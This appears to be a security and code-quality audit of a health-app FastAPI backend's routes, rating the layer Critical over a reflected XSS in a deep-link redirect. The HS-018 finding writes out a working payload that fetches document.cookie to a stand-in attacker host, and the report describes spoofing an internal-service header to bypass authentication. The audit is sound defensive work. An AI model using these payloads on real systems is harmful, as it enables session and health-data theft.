# Audit: BE-M02 — routes (FastAPI router layer)

**Module:** `health_system/backend/app/api/routes/` + `app/api/router.py`
**Audit date:** 2026-05-13
**Auditor:** ThienPDM (via Cascade)
**Framework version:** v1
**Track:** Phase 1 Track 2 — health_system backend
**Depth mode:** Full

## Scope

Module routes chứa 13 router file FastAPI define HTTP endpoint cho mobile app + IoT sim cross-repo: `/api/v1/mobile/*` (mobile-facing) + `/api/v1/mobile/admin/*` + `/api/v1/mobile/telemetry/*` (internal-service). Scope audit = aggregator `router.py` + 13 router file (auth, telemetry, profile, device, relationships, emergency, monitoring, fall_events, risk, notifications, settings, admin, health). ~2,500 LoC. Per-endpoint security review. Phạm vi loại trừ: service layer business logic (BE-M03), schema definition (BE-M05), repository session lifecycle (BE-M06), middleware wiring + bootstrap (BE-M01).

| File | LoC | Endpoint count | Auth model | Notes |
|---|---|---|---|---|
| `router.py` | ~25 | aggregator | — | `prefix="/mobile"` + 13 sub-router include. |
| `auth.py` | ~270 | 9 | mixed | 8 public auth flow + 1 `change-password` (current_user). 5 endpoint có rate limit. `deep-link-redirect` HTML response — XSS vector. |
| `telemetry.py` | ~570 | 5 | mixed | **D-021 fix point**: `/ingest`+`/alert` có `require_internal_service` ✓; `/sleep`+`/imu-window`+`/sleep-risk` THIẾU GUARD (HS-004 reference). |
| `device.py` | ~165 | 7 | `get_current_user` | Resource ownership check qua service layer. |
| `emergency.py` | ~140 | 4 | `get_current_user` | `get_sos_detail` có resource ownership + admin bypass + location redaction. |
| `health.py` | ~7 | 1 | none | Liveness probe — public OK. |
| `admin.py` | ~290 | 9 | router-level `require_internal_service` | All endpoints internal-only. Match ADR-005. |
| `fall_events.py` | ~155 | 4 | `get_target_profile_id` | List/get/dismiss/survey. Resource ownership service-layer. |
| `monitoring.py` | ~210 | 8 | `get_target_profile_id` + clinician audience | Phase 5 audience-based DTO selector. |
| `notifications.py` | ~180 | 6 | `get_current_user` | `/ws/notifications` WebSocket — manual JWT decode. |
| `profile.py` | ~50 | 3 | `get_current_user` | DELETE 204 (soft delete via service). |
| `relationships.py` | ~210 | 11 | `get_current_user` | M:N relationship lifecycle + medical info P-4 endpoint. |
| `risk.py` | ~530 | 6 | mixed | `/risk/calculate` accept `X-Internal-Service` bypass user auth. 5 endpoint execute SQL trực tiếp. |
| `settings.py` | ~50 | 2 | `get_current_user` | `update_general_settings` admin check inline. |

## Scores

| Axis | Score | Notes |
|---|---|---|
| Correctness | 1/3 | HS-004 telemetry endpoints thiếu auth guard verify confirm. HTML response trong `deep-link-redirect` JS string interpolation từ user input (HS-018). |
| Readability | 3/3 | Docstring chi tiết per route + cross-reference plan/ADR (telemetry.py best-in-class). Tag + prefix consistent. |
| Architecture | 2/3 | Per-router separation tốt. Trừ điểm: `risk.py` 530 LoC import service VÀ trực tiếp execute SQL `text()` query (HS-019 architecture violation). |
| Security | 0/3 | **CRITICAL anti-pattern auto-flag hit**: HTML response f-string interpolation từ user `code`+`email` query param trong `deep_link_redirect` → reflected XSS. Force Security=0 + Band Critical override. |
| Performance | 3/3 | Pagination validate `limit/offset` consistent. BackgroundTasks cho push fan-out. WebSocket polling 5s — không scale nhưng acceptable POC. |
| **Total** | **9/15** | Band: **🔴 Critical** — Security=0 anti-pattern hit (HS-018 XSS) override. |

## Findings

### Correctness

- `backend/app/api/routes/telemetry.py:206, 363, 420, 445` — **D-021 fix point reference**. Endpoint `/ingest`+`/alert` có `dependencies=[Depends(require_internal_service)]` ✓. Endpoint `/sleep` (line 363), `/imu-window` (line 420), `/sleep-risk` (line 445) **KHÔNG** có guard. **HS-004 đã document**, governed by ADR-005. Reference only — KHÔNG re-flag. Verify confirm tại audit này. Phase 4 fix HS-004 cần thêm guard + đồng bộ HS-006 (BE-M08 internal secret fail-open) để guard không thành no-op.

- `backend/app/api/routes/auth.py:269-321` — `deep_link_redirect` query param `action`, `code`, `email` chèn vào HTML f-string + JavaScript variable không escape:
  ```python
  ios_url = f"{settings.MOBILE_DEEP_LINK_SCHEME}://{action}?code={code}&email={email}"
  android_intent_url = f"intent://{action}?code={code}&email={email}#Intent;..."
  html_content = f"""...
      var targetUrl = isAndroid ? "{android_intent_url}" : "{ios_url}";
  """
  ```
  
  Attacker craft URL `?action=verify&code=";alert(document.cookie);//&email=victim@x.com` → JS string `var targetUrl = "...";alert(document.cookie);//"...` → execute JS context của BE domain. CSRF + cookie steal nếu user authenticated cùng domain. PHI/JWT extraction risk.
  
  Fix: `urllib.parse.quote_plus()` cho 3 param trước inject f-string. Hoặc switch sang Jinja2 template với auto-escape ON.
  
  Allocate **HS-018** (Critical, anti-pattern auto-flag — `dangerouslySetInnerHTML` equivalent với user input).

- `backend/app/api/routes/risk.py:194-243` — `/risk/calculate` POST accept `X-Internal-Service` header bypass user auth:
  ```python
  if internal_service == "iot-simulator":
      return context  # Skip user auth check
  ```
  Endpoint này **KHÔNG dùng `require_internal_service` dependency** — chỉ check string match trong helper `_resolve_calculate_user_context`. Combine với HS-006 (`require_internal_service` fail-open khi env unset) → khi production deploy không set `INTERNAL_SERVICE_SECRET`, attacker pass `X-Internal-Service: iot-simulator` header bypass user auth. Bug compound nhưng đã tracked qua HS-006. Reference only.

- `backend/app/api/routes/risk.py:425-466` — `/risk/{risk_score_id}/detail` GET resource ownership check inline:
  ```python
  if risk_score.user_id != current_user.id:
      raise HTTPException(status_code=403, detail="Access denied")
  ```
  Chỉ check owner — KHÔNG check caregiver-link relationship. **Inconsistent** với `monitoring.py` `get_target_profile_id` pattern cho phép caregiver xem qua linked profile. Endpoint này refuse caregiver access. Nếu UC yêu cầu caregiver xem risk detail → bug. P1 review UC.

- `backend/app/api/routes/notifications.py:127-158` — `/ws/notifications` WebSocket auth:
  ```python
  token = websocket.query_params.get("token")
  if token is None:
      auth_header = websocket.headers.get("authorization", "")
      if auth_header.lower().startswith("bearer "):
          token = auth_header[7:].strip()
  payload = decode_token(token or "")
  ```
  Token query string `?token=...` risk: token leak vào server access log + browser history. Acceptable WebSocket pattern (header không support trong browser WS API). P2 doc note.

- `backend/app/api/routes/auth.py:138, 147` — `register` rate limit `check-then-act` pattern:
  ```python
  if register_rate_limiter.is_rate_limited(ip_address):
      raise HTTPException(status_code=429, ...)
  success, message, token_data = AuthService.register(...)
  register_rate_limiter.record_attempt(ip_address)
  ```
  TOCTOU race window giữa check và record (HS-008 reference). Bypass margin nhỏ. Compound với HS-008 multi-worker bypass.

- `backend/app/api/routes/emergency.py:97-118` — `get_sos_detail` check authorization SAU khi đã fetch detail. Nếu attacker pass valid `sos_id` của user khác, `get_sos_detail` populate đầy đủ detail (incl. PHI), then `check_user_has_access` reject 403. Detail object sống trong memory → log có thể leak. Acceptable rủi ro thấp. P2.

- `backend/app/api/routes/relationships.py:162-167` — `request_relationship` post-create reformat full list rồi search match:
  ```python
  rel = RelationshipService.request_relationship(db, current_user, payload)
  all_rels = RelationshipService.format_relationships(db, current_user.id)
  for r in all_rels:
      if r["id"] == rel.id:
          return r
  ```
  N+1-ish: tạo 1 relationship rồi fetch ALL chỉ để format 1 row. Inefficient. Phase 3 deep-dive candidate. P2.

### Readability

- `backend/app/api/routes/telemetry.py:1-50` — module có 4 helper function (`_pick_value`, `_pick_float`, `_pick_int`, `_pick_bool`) + 4 mapping helper (`_map_alert_severity`, `_map_alert_type`, `_map_telemetry_risk_level`, `_build_alert_title`). Tách logic mapping ra khỏi route handler. Pattern tốt cho data normalization.
- `backend/app/api/routes/telemetry.py:415-450` — `/imu-window` docstring chi tiết best-in-class. Giải thích Phase 4B-thin slice flow + WHY rule-based fallback không invoked cho fall (alert-state vs insight-state). Cross-reference `backend/docs/risk-contract-baseline.md`.
- `backend/app/api/routes/fall_events.py:14-18` — module docstring rõ ràng: scope 3 route + auth model + 404 enumeration-resistant pattern ("the same 404 for not-found and not-yours"). Security comment best-in-class.
- `backend/app/api/routes/admin.py:45-52` — module-level `dependencies=[Depends(require_internal_service)]` áp dụng tất cả 9 endpoint. Pattern đúng — không cần repeat per route.
- `backend/app/api/routes/monitoring.py:11-20` — sub-router pattern (`metrics_router`, `analysis_router`) tách 2 concern (real-time vitals vs risk analysis). `router.include_router()` aggregate. Architecture rõ.
- `backend/app/api/routes/risk.py` — 530 LoC chia 6 endpoint + 7 helper. Reader phải nhảy nhiều giữa router/service-like helper. P1 split.
- `backend/app/api/routes/auth.py:269-321` — `deep_link_redirect` HTML inline 50+ dòng template. Reader code thấy raw HTML mixed với Python — anti-pattern, escape khó (HS-018 trigger).
- `backend/app/api/routes/notifications.py:189-205` — `_serialize_notification` helper convert Pydantic NotificationItem → dict cho WebSocket JSON emit. OK.

### Architecture

- **HS-019 — Router execute SQL trực tiếp** (`risk.py`): Multiple endpoint helper function execute `text(...)` SQL query trong router file:
  - `_load_device_owner_context` line 99 — `db.execute(text("SELECT ... FROM devices INNER JOIN users ..."))`
  - `_fetch_latest_vitals` line 140 — `db.execute(text("SELECT ... FROM vitals"))`
  - `recalculate_risk` line 268 — `db.execute(text("SELECT id FROM devices ..."))`
  - `get_latest_risk_scores` line 341 — `db.execute(text("SELECT rs.id ... FROM risk_scores ..."))`
  - `get_risk_history` line 504 — `db.query(RiskScore).filter(...)`
  
  Steering `22-fastapi.md` rule: "Business logic ở service, không trong router". Vi phạm layer separation:
  - Router → Service → Repository (đúng).
  - Router → SQL (sai — bypass service + repository).
  
  Allocate **HS-019** (Medium, Architecture). Phase 4 refactor di chuyển sang `RiskRepository` + `RiskService`.

- `backend/app/api/routes/risk.py:530 LoC` + `telemetry.py:570 LoC` — fat router anti-pattern approaching. Tham chiếu framework v1 Readability rubric "File > 500 lines split candidate". Cả 2 file vượt ngưỡng nhưng do helper function support, không phải route handler bloat. Borderline.

- `backend/app/api/routes/auth.py:269-321` — `deep_link_redirect` 50+ dòng HTML inline → file 320 LoC. HTML render nên Jinja2 template + `Jinja2Templates` từ `fastapi.templating` để auto-escape user input. P0 fix HS-018.

- Per-router prefix consistent với D-019 governing ADR-004. Aggregator mount `prefix="/mobile"` → main.py mount với `root_path="/api/v1"` → effective `/api/v1/mobile/*`. Phase 4 ADR-004 execute drop `root_path` hack.

- Sub-router pattern (`monitoring.py` tách metrics/analysis) là good design. Inconsistent — chỉ `monitoring.py` apply.

- `notifications.py` mix REST endpoint + WebSocket trong cùng file. Acceptable vì cùng domain, nhưng concern kỹ thuật khác (HTTP vs WS). Architecture borderline OK.

### Security

- **Anti-pattern auto-flag scan**:
  - `eval()` / `exec()`? **NO**.
  - SQL string concat? **NO** — toàn parameterized via `text(... :param ...)`.
  - **`dangerouslySetInnerHTML` / unsafe HTML với user input**? **YES** — `auth.deep_link_redirect` line 269-321 (HS-018, ABOVE). FORCE Security=0 + Band Critical override.
  - Plaintext credential? **NO**.
  - CORS wildcard? scope BE-M01 (HS-005).
  - SSL verify disabled? **NO**.
  - Hardcoded secret? **NO**.
  
  **Kết luận: 1 hit (HS-018 XSS) → Security=0 force override + Band Critical.**

- **HS-018 (Critical) — XSS via deep-link-redirect HTML interpolation**:
  - File: `backend/app/api/routes/auth.py:269-321`.
  - Severity: Critical (Security axis 0 + auto-flag anti-pattern).
  - Root cause: f-string template inject `code`/`email`/`action` query param vào HTML + inline `<script>` tag.
  - Impact: Reflected XSS trên BE domain. Attacker craft email link `https://api.healthguard.../api/v1/mobile/auth/deep-link-redirect?action=verify&code="><script>fetch('https://attacker.x/'+document.cookie)</script>&email=x@y` → user click email → JS execute on BE domain → cookie/JWT exfiltration.
  - Mitigation:
    - Wrap user input qua `urllib.parse.quote_plus()` trước f-string inject.
    - Better: switch sang Jinja2 template với auto-escape default ON.
    - Best: tách deep-link redirect sang FE static page (CDN host).

- **HS-004 telemetry no-auth**: 3 endpoint `/sleep`, `/imu-window`, `/sleep-risk` thiếu `require_internal_service`. Đã document, governed by ADR-005. Reference only.

- **HS-006 internal secret fail-open**: combine với HS-004 fix → no-op guard nếu env unset. Reference only.

- `backend/app/api/routes/admin.py` router-level `dependencies=[Depends(require_internal_service)]` cover 9 endpoint. **Đúng pattern ADR-005**. KHÔNG hit anti-pattern.

- `backend/app/api/routes/emergency.py:107-117` — `get_sos_detail` resource ownership check + admin bypass + location redaction:
  ```python
  has_access = EmergencyRepository.check_user_has_access(db, current_user.id, sos_detail.patient.user_id)
  if not has_access and current_user.role != "admin":
      raise HTTPException(status_code=403, ...)
  ```
  Defense-in-depth: relationship check + role bypass + location PHI redaction cho caregiver thiếu permission. Bug fix G-3 documented inline. **Positive finding**.

- `backend/app/api/routes/profile.py:24-39` — request IP + user-agent capture qua `request.client.host` + `headers["user-agent"]`. Pass vào service cho audit log. Compliance steering.

- `backend/app/api/routes/notifications.py:127-158` — WebSocket auth qua `decode_token` rồi check `user.is_active`. KHÔNG check `token_version` rotation (BE-M08 finding). Long-lived WebSocket connection có thể tiếp tục nhận event sau khi user logout-all. P1 review.

- `backend/app/api/routes/risk.py:202-225` — `_resolve_calculate_user_context` helper:
  ```python
  if internal_service == "iot-simulator":
      return context  # bypass user auth
  ```
  Header value match `iot-simulator` literal trivially spoofable (HS-006 fail-open compound). Phase 4 fix: invoke `Depends(require_internal_service)` thay vì manual check.

- `backend/app/api/routes/relationships.py:73-89` — `get_linked_contact_medical_info` PHI exposure endpoint UC P-4. Service layer phải audit log. Schema-side đã flag (BE-M05). Router-side trust service. OK if service implement.

- `backend/app/api/routes/admin.py:111-135` — admin endpoint accept `user_email` thay vì `user_id`. Email-based identifier OK cho admin operation, enumeration risk minor.

### Performance

- Endpoint validate query `limit/offset` với `Field(ge=1, le=100)` → reject pagination request quá lớn. Pattern consistent fall_events, monitoring, notifications, risk history.
- `BackgroundTasks` dùng đúng cho push notification fan-out. Không block request thread.
- `notifications.py:174-181` WebSocket polling 5s — không scale. Acceptable POC, P2 pivot Postgres LISTEN/NOTIFY.
- `relationships.py:162-167` post-create full-list refetch — N+1-ish. P2.
- `telemetry.py:206-340` `/ingest` batch SQL `INSERT` qua `text()` parameterized + `ON CONFLICT DO NOTHING` — efficient bulk insert.
- `risk.py` 5 endpoint execute SQL trực tiếp — bypass service caching. Phase 4 refactor (HS-019) sẽ có cơ hội add caching.
- Không có N+1 obvious trong các route khác. Service layer responsibility.
- Không có sync I/O blocking trong async route — toàn route declare `def` (sync) consistent SQLAlchemy sync Session pattern.

## Positive findings

- `backend/app/api/routes/admin.py:45-52` — router-level `dependencies=[Depends(require_internal_service)]` áp dụng 9 endpoint. Pattern clean, DRY.
- `backend/app/api/routes/emergency.py:107-117` — defense-in-depth resource ownership: relationship check + admin bypass + location PHI redaction. Bug fix G-3 commented inline.
- `backend/app/api/routes/fall_events.py:14-18` — module docstring "404 enumeration-resistant pattern" — security best practice documented.
- `backend/app/api/routes/telemetry.py:1-100` — helper function pattern tách logic mapping ra khỏi route handler. Code organization tốt.
- `backend/app/api/routes/telemetry.py:415-450` — `/imu-window` docstring giải thích Phase 4B-thin slice flow + design rationale. Cross-reference baseline doc.
- `backend/app/api/routes/monitoring.py:135-156` — `audience` parameter pattern cho clinician DTO refinement. Phase 5 design clean.
- Per-router tag + prefix consistent. OpenAPI doc rõ.
- Pagination `Query(default=20, ge=1, le=100)` consistent across list endpoints.
- `BackgroundTasks` usage đúng cho push notification fan-out — không block request thread.
- `backend/app/api/routes/notifications.py:189-205` — WebSocket payload serialization helper extracted.
- Aggregator `router.py:18` clean — 13 sub-router include với 1 prefix. Không inline route logic.

## New bugs

| BugID | Severity | Summary | File:Line | Axis impacted |
|---|---|---|---|---|
| HS-018 | Critical | XSS reflected qua HTML f-string interpolation user query param `code`+`email`+`action` trong `deep_link_redirect`; attacker craft email link execute JS trên BE domain → cookie/JWT exfiltration | `backend/app/api/routes/auth.py:269-321` | Security |
| HS-019 | Medium | Router `risk.py` execute SQL `text(...)` trực tiếp 5 endpoint helper (`_load_device_owner_context`, `_fetch_latest_vitals`, `recalculate_risk`, `get_latest_risk_scores`, `get_risk_history`) — vi phạm layer separation steering `22-fastapi.md` | `backend/app/api/routes/risk.py:99-510` | Architecture |

## Recommended actions (Phase 4)

### P0

- [ ] **HS-018**: Fix XSS trong `deep_link_redirect`. 3 cấp độ:
  - **Quick fix**: Wrap 3 query param qua `urllib.parse.quote_plus()` trước inject f-string. Verify regression test.
  - **Better**: Switch sang Jinja2 template:
    ```python
    from fastapi.templating import Jinja2Templates
    templates = Jinja2Templates(directory="app/templates")
    
    @router.get("/deep-link-redirect", include_in_schema=False)
    def deep_link_redirect(action: str, code: str, email: str, request: Request):
        return templates.TemplateResponse(
            "deep_link_redirect.html",
            {"request": request, "action": action, "code": code, "email": email,
             "scheme": settings.MOBILE_DEEP_LINK_SCHEME, ...}
        )
    ```
    Auto-escape default ON. Move HTML sang `app/templates/deep_link_redirect.html`.
  - **Best**: Rebase deep-link redirect logic sang FE static page (CDN host).
  - Regression test: `tests/test_xss_deep_link.py::test_malicious_payload_escaped` với payload `code='">alert(1)<'`.

### P1

- [ ] **HS-019**: Refactor `risk.py` SQL helpers sang service/repository layer.
  - Move `_load_device_owner_context`, `_fetch_latest_vitals`, `_build_inference_payload`, `_compute_trend7d`, `_get_previous_score`, `_extract_confidence` → `app/services/risk_handler_service.py`.
  - Move SQL queries → `app/repositories/risk_repository.py`.
  - Router `risk.py` chỉ orchestrate: parse Pydantic → call service → return Pydantic.
  - Reduce file LoC từ 530 → ~200.
- [ ] **WebSocket token_version check**: `notifications.py:127-158` `/ws/notifications` connect → after `decode_token` đọc `User.token_version` từ DB + so với `payload.token_version`. Mismatch → close. Long-lived WS connection invalidate khi user logout-all.
- [ ] **Risk recalculate vs detail caregiver consistency**: `/risk/{id}/detail` chỉ owner access; `/monitoring/analysis/risk-reports/{id}` cho phép caregiver. UC verify: caregiver xem risk report detail → consistent path.
- [ ] **Config-driven `_EXPOSE_CODES_FOR_TESTING`**: hiện đọc `os.getenv` module-level (auth.py:38). Migrate sang `Settings` khi pydantic-settings migrate.
- [ ] **WebSocket polling pivot**: `/ws/notifications` 5s polling → Postgres LISTEN/NOTIFY hoặc Redis Pub/Sub. P1-P2 scaling.

### P2

- [ ] **`emergency.py:97-118` reverse check pattern**: check authorization first, avoid PHI in memory before reject.
- [ ] **`relationships.py:162-167` post-create N+1**: service trả `RelationshipResponse` directly, không refetch.
- [ ] **WebSocket token query param doc**: cảnh báo log leak risk + recommend prefer header path.
- [ ] **Health check liveness vs readiness**: thêm `/health/live` + `/health/ready`.
- [ ] **Router file split `risk.py`** sau khi extract SQL HS-019.
- [ ] **Settings admin check inline → dependency**: tạo `Depends(require_admin_role)` reuse.

## Out of scope

- Service layer business logic — BE-M03 services.
- Pydantic schema field-by-field validation — BE-M05 schemas.
- Repository session lifecycle + N+1 detection trong service-side queries — BE-M06 repositories.
- Middleware wiring + bootstrap — BE-M01 main.
- HS-005 CORS wildcard fix — BE-M01.
- HS-006 internal service secret fail-open — BE-M08.
- HS-007 JWT TTL drift + HS-008 rate limiter — BE-M09.
- ADR-004 root_path hack drop scheduling Phase 4 ADR execution.
- Defer Phase 3: per-endpoint contract test snapshot, e2e mobile flow test, OpenAPI spec generation regression check.

## Cross-references

- BUGS INDEX (new):
  - HS-018 — XSS reflected via deep_link_redirect HTML interpolation (Critical)
  - HS-019 — Router SQL execution bypass service/repository layer (Medium)
- BUGS INDEX (reference, không re-flag — pre-existing):
  - [HS-004](../../../BUGS/HS-004-telemetry-sleep-endpoints-no-auth.md) — `/sleep`, `/imu-window`, `/sleep-risk` thiếu auth guard (Critical, ADR-005 governs).
  - [HS-005](../../../BUGS/INDEX.md) — CORS wildcard (BE-M01 scope).
  - [HS-006](../../../BUGS/INDEX.md) — `require_internal_service` fail-open (BE-M08 scope, compound HS-004 fix → no-op risk).
  - [HS-008](../../../BUGS/INDEX.md) — Rate limiter TOCTOU (BE-M09, `auth.py:138-147` consumer).
  - [XR-001](../../../BUGS/XR-001-topology-steering-endpoint-prefix-drift.md) — topology prefix drift; aggregator mount `prefix="/mobile"` consumer của D-019.
- ADR INDEX:
  - [ADR-004](../../../ADR/INDEX.md) — API prefix standardization. Aggregator + sub-router design.
  - [ADR-005](../../../ADR/INDEX.md) — Internal service auth strategy. HS-004 fix Phase 4.
  - [ADR-008](../../../ADR/INDEX.md) — Mobile BE không host system settings write. `settings.py:33` admin check inline reference.
  - [ADR-013](../../../ADR/INDEX.md) — IoT Simulator direct-DB write. `risk.py:202-225` `X-Internal-Service: iot-simulator` bypass.
- Intent drift (reference only — không re-flag — blacklist):
  - `D-019` — API prefix `root_path` hack. Governed ADR-004. Aggregator consumer.
  - `D-021` — telemetry endpoints inconsistent internal guard. Governed ADR-005, tracked HS-004. **THIS audit verify confirm finding** (line 363/420/445 missing guard).
- Related audit files:
  - [`BE_M01_main_bootstrap_audit.md`](./BE_M01_main_bootstrap_audit.md) — middleware order trước route handler.
  - [`BE_M04_models_audit.md`](./BE_M04_models_audit.md) — model `Alert` thiếu 7 field consumer trong route.
  - [`BE_M05_schemas_audit.md`](./BE_M05_schemas_audit.md) — Pydantic boundary; HS-014 duplicate `FamilyProfileSnapshot` consumer trong `relationships.py:30-39`.
  - [`BE_M08_core_audit.md`](./BE_M08_core_audit.md) — `core/dependencies.py:require_internal_service` consumer + HS-006.
  - [`BE_M09_utils_audit.md`](./BE_M09_utils_audit.md) — rate limiter pattern in `auth.py` consumer.
  - `BE_M03_services_audit.md` (Task 9 pending) — service consume from route layer; HS-019 refactor target.
  - `BE_M06_repositories_db_audit.md` (Task 7 pending) — repository pattern; HS-019 refactor target.
  - `BE_M07_adapters_audit.md` (Task 8 pending) — `model_api_client` consumer trong telemetry.
- Preflight context: [`_PREFLIGHT_CONTEXT.md`](./_PREFLIGHT_CONTEXT.md)
- Framework rubric: [`00_audit_framework.md`](../../00_audit_framework.md) v1
- Precedent: [`iot-simulator/M01_routers_audit.md`](../iot-simulator/M01_routers_audit.md)
- Steering: `health_system/.kiro/steering/22-fastapi.md` (router thin, business logic ở service rule).
